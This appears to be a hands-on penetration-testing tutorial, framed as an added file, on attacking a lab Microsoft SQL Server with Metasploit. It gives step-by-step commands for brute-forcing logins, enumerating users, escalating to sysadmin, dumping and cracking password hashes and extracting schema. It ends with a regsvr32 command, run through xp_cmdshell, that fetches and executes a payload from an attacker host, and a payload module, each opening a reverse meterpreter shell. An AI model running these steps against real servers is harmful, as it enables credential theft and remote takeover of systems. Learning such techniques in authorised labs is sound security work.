@@ -1,0 +1,114 @@
+
+MSSQL Penetration Testing with Metasploit
+
+Hello friends today we are performing MSSQL penetration testing using metasploit framework in order to retrieve basic information such as database name, usernames, tables name and etc from inside SQL server running on Windows operating system. In our previous article we had setup Microsoft SQL server in Windows 10.
+Requirement
+Attacker: kali Linux (NMAP)
+Target: Windows 10 (MS SQL Server)
+Let’s start!!
+This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).
+use auxiliary/scanner/mssql/mssql_login
+msf auxiliary(mssql_login) > set rhost 192.168.1.104
+msf auxiliary(mssql_login) > set user_file /root/Desktop/user.txt
+msf auxiliary(mssql_login) > set pass_file /root/Desktop/pass.txt
+msf auxiliary(mssql_login) > run
+This will perform brute force attack matching valid combination for username and password from given dictionary.
+
+In specified image you can observe that we had successfully retrieve credential for two users:
+Username: ignite and password: 12345
+
+Username: sa and password: 123
+
+This module will perform a series of configuration audits and security checks against a Microsoft SQL Server database. For this module to work, valid administrative user credentials must be supplied.
+use auxiliary/admin/mssql/mssql_enum
+msf auxiliary(mssql_enum) > set rhost 192.168.1.104
+msf auxiliary(mssql_enum) >set password admin123
+msf auxiliary(mssql_enum) >run
+Above module had dumped the MSSQL configuration setting where you can observe enabled and disable functions. For example:
+Xp-cmdshell is enabled which is a function of Microsoft SQL Server that allows system administrators to execute operating system command. Attacker can inject malicious command of file for making unauthorized access into server.
+
+This module can be used to obtain a list of all logins from a SQL Server with any login. Selecting all of the logins from the master..syslogins table is restricted to sysadmins. However, logins with the PUBLIC role (everyone) can quickly enumerate all SQL Server logins using the SUSER_SNAME function by fuzzing the principal_id parameter. This is pretty simple, because the principal IDs assigned to logins are incremental. Once logins have been enumerated they can be verified via sp_defaultdb error analysis. This is important, because not all of the principal IDs resolve to SQL logins (some resolve to roles instead). Once logins have been enumerated, they can be used in dictionary attacks.
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+msf auxiliary(mssql_enum_sql_logins) >set rhost 192.168.1.104
+msf auxiliary(mssql_enum_sql_logins) > set password admin123
+msf auxiliary(mssql_enum_sql_logins) > run
+
+From given below image you can confirm the MSSQL Server login such as “sa” which is also sysadmin and another user “ignite”. Once you have enumerated all logins after that you can make dictionary attack for their passwords.
+
+This module can be used to escalate privileges to sysadmin if the user has the db_owner role in a trustworthy database owned by a sysadmin user. Once the user has the sysadmin role the msssql_payload module can be used to obtain a shell on the system.
+use auxiliary/admin/mssql/mssql_escalate_dbowner
+msf auxiliary(mssql_escalate_dbowner) > set rhost 192.168.1.104
+msf auxiliary(mssql_escalate_dbowner) > set password admin123
+msf auxiliary(mssql_escalate_dbowner) >run
+Above module will identify whether specified user do have system administrator role or not. From given below image you can perceive that “sa” is sysadmin user.
+
+This module can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user. In most cases, this results in additional data access, but in some cases it can be used to gain sysadmin privileges.
+use auxiliary/admin/mssql/mssql_escalate_execute_as
+msf auxiliary(mssql_escalate_execute_as) > set rhost 192.168.1.104
+msf auxiliary(mssql_escalate_execute_as) > set password admin123
+msf auxiliary(mssql_escalate_execute_as) > run
+From given below image you can perceive that “sa” is sysadmin user.
+
+This module will allow for simple SQL statements to be executed against a MSSQL/MSDE instance given the appropriate credentials.
+use auxiliary/admin/mssql/mssql_sql
+msf auxiliary(mssql_sql) > set rhost 192.168.1.104
+msf auxiliary(mssql_sql) > set password admin123
+msf auxiliary(mssql_sql) > run
+From given below image you can observe that by default it has run SQL statement to Select version as result it has dumped the complete detail version of SQL server. Here you can execute your own sql statement. 
+
+This module extracts the usernames and encrypted password hashes from a MSSQL server and stores them for later cracking. This module also saves information about the server version and table names, which can be used to seed the wordlist.
+use auxiliary/scanner/mssql/mssql_hashdump
+msf auxiliary(mssql_hashdump) > set rhost 192.168.1.104
+msf auxiliary(mssql_hashdump) > set password admin123
+msf auxiliary(mssql_hashdump) > run
+From given below image you can read the hash value of password set for every database user in MMSQL server.
+
+This module uses John the Ripper to identify weak passwords that have been acquired from the mssql_hashdump module. Passwords that have been successfully cracked are then saved as proper credentials
+use auxiliary/analyze/jtr_mssql_fast
+msf auxiliary(jtr_mssql_fast) > run
+Great!!  The tool John the ripper has successfully decoded the hash value set for passwords.
+
+This module attempts to extract the schema from a MSSQL Server Instance. It will disregard builtin and example DBs such as master, model, msdb, and tempdb. The module will create a note for each DB found, and store a YAML formatted output as loot for easy reading.
+use auxiliary/scanner/mssql/mssql_schemadump
+msf auxiliary(mssql_schemadump) > set rhost 192.168.1.104
+msf auxiliary(mssql_schemadump) > set password admin123
+msf auxiliary(mssql_schemadump) > run
+Here it has dump the information schema for database “ignite” with table name “student” , 4 columns name with column types:
+DB: ignite
+Table name: student_details
+
+(CT: Numeric ; CL =9)
+
+ (CT: nvarchar; CL =100)
+
+ (CT: nchar; CL : =20)
+
+ (CT: sysname; CL: = 100)
+
+This module simplifies the Regsvr32.exe Application Whitelisting Bypass technique. The module creates a web server that hosts an .sct file. When the user types the provided regsvr32 command on a system, regsvr32 will request the .sct file and then execute the included PowerShell command. This command then downloads and executes the specified payload (similar to the web_delivery module with PSH). Both web requests (i.e., the .sct file and PowerShell download and execute) can occur on the same port.
+use exploit/windows/misc/regsvr32_applocker_bypass_server
+msf exploit(regsvr32_applocker_bypass_server) > set lhost 192.168.1.115
+msf exploit(regsvr32_applocker_bypass_server) > set lport 4455
+msf exploit(regsvr32_applocker_bypass_server) > run
+Since we known xp_cmdshell function is enabled in SQL server therefore we can easy shoot the target machine by injecting a malicious .dll file through xp_cmdshell function.
+After executing above module we will get malicious .dll code as highlighted in the below image, copy this code for injecting into xp_cmdshell as statement.
+
+This module will execute a Windows command on a MSSQL/MSDE instance via the xp_cmdshell procedure. A valid username and password is required to use this module
+use auxiliary/admin/mssql/mssql_exec
+msf auxiliary(mssql_exec) > set rhost 192.168.1.104
+msf auxiliary(mssql_exec) > set password admin123
+msf auxiliary(mssql_exec) >set CMD “regsvr32 /s /n /u /i:http://192.168.1.115:8080/P8LsfwnWN.sct scrobj.dll”
+msf auxiliary(mssql_exec) >run
+If you will observe above command sets in specified module, you will notice that here we have set above copied malicious .dll code as CMD statement. Hence as soon as we will run this exploit it creates a backdoor in victim’s machine for unauthorized access.
+Wonderful!! We have got reverse connection of target machine through meterpreter session.
+
+This module executes an arbitrary payload on a Microsoft SQL Server by using the “xp_cmdshell” stored procedure. Currently, three delivery methods are supported. First, the original method uses Windows ‘debug.com’. File size restrictions are avoided by incorporating the debug bypass method presented by SecureStat at Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems. A second method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable. By default the Command Stager uses ‘wcsript.exe’ to generate the executable on the target. Finally, ReL1K’s latest method utilizes PowerShell to transmit and recreate the payload on the target. NOTE: This module will leave a payload executable on the target system when the attack is finished.
+use exploit/windows/mssql/mssql_payload
+msf exploit(mssql_payload) >set rhost 192.168.1.104
+msf exploit(mssql_payload) >set password admin123
+msf exploit(mssql_payload) >set srvhost 192.168.1.115
+msf exploit(mssql_payload) >run
+
+Awesome!!  Once again we have got reverse connection of target machine through meterpreter session. 
+
+Author: Sanjeet Kumar is a Information Security Analyst | Pentester | Researcher  Contact Here
